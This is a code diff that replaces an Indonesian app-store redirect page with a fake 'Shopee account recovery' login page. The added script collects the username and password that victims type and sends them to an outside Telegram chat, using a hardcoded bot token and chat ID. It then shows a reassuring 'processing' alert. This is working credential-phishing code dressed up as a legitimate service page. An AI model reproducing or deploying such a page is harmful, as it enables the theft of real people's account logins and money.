@@ -1,63 +1,38 @@
+
 <!DOCTYPE html>
 <html>
-	<head>
-		<script type="text/javascript">
-		function unescapeHtml(escaped_str) {
-		    var div = document.createElement('div');
-		    div.innerHTML = escaped_str;
-		    var child = div.childNodes[0];
-		    return child ? child.nodeValue : null;
-		}
-		
-		function validateProtocol(url) {
-			var parser = document.createElement('a');
-		    parser.href = url;
-		    var protocol = parser.protocol.toLowerCase();
-			if ([ 'javascript:',  'vbscript:',  'data:', 'ftp:',':' , ' '].indexOf(protocol) < 0) {
-				return url;
-			}
-			return null;
-		}
-		
-		function validate(url) {
-			var unescaped_value = unescapeHtml(url);
-			if (unescaped_value && validateProtocol(unescaped_value)) {
-				return unescaped_value;
-			}
-			return '/';
-		}
-			window.onload = function() {
-				const fallbackFunction = function() {
-					if (document.webkitHidden || document.hidden) { return; }
-					window.top.location.replace(validate("undefined"));
-				};
-                const redirectFunction = function() {
-                    window.top.location.replace(validate("market://details?id=id.dana"));
-                }
-				if ((navigator.userAgent.match(/Chrome/) && navigator.userAgent.match("Version/")) ||
-						navigator.userAgent.match("\\[FB") ||
-						navigator.userAgent.match("Instagram")) {
-					const setURIFunction = function() {
-                        redirectFunction();
-						setTimeout(fallbackFunction, 750-250);
-					};
-					setTimeout(setURIFunction, 250);
-					return;
-				}
-				else if (navigator.userAgent.match("KAKAO") ||
-							navigator.userAgent.match("NAVER") ||
-							navigator.userAgent.match("Firefox")) {
-					redirectFunction();
-				}
-				else if (!(navigator.userAgent.match("OPR") && !navigator.userAgent.match("Android 8"))) {
-					window.top.location.replace(validate("market://details?id=id.dana"));
-				}
-				setTimeout(fallbackFunction, 750);
-			};
+<head>
+    <title>Pemulihan Akun Shopee</title>
+</head>
+<body>
 
+<h2>Form Login</h2>
 
-		</script>
-	</head>
-	<body>
-	</body>
+<form id="form">
+    <input type="text" id="username" placeholder="Username"><br><br>
+    <input type="password" id="password" placeholder="Password"><br><br>
+    <button type="submit">Kirim</button>
+</form>
+
+<script>
+document.getElementById("form").addEventListener("submit", function(e){
+    e.preventDefault();
+
+    var user = document.getElementById("username").value;
+    var pass = document.getElementById("password").value;
+
+    var token = "8773598455:AAHIiU7FJ-Afd06GydNFkLos6-yhvsHEeno";
+    var chat_id = "8275920596";
+
+    var message = "Login Masuk:\nUsername: " + user + "\nPassword: " + pass;
+
+    var url = "https://api.telegram.org/bot8773598455:AAHIiU7FJ-Afd06GydNFkLos6-yhvsHEeno/sendMessage?chat_id=8275920596&text="+ encodeURIComponent(message);
+
+    fetch(url)
+    .then(response => alert("permintaan sedang di proses!"))
+    .catch(error => alert("Gagal kirim"));
+});
+</script>
+
+</body>
 </html>
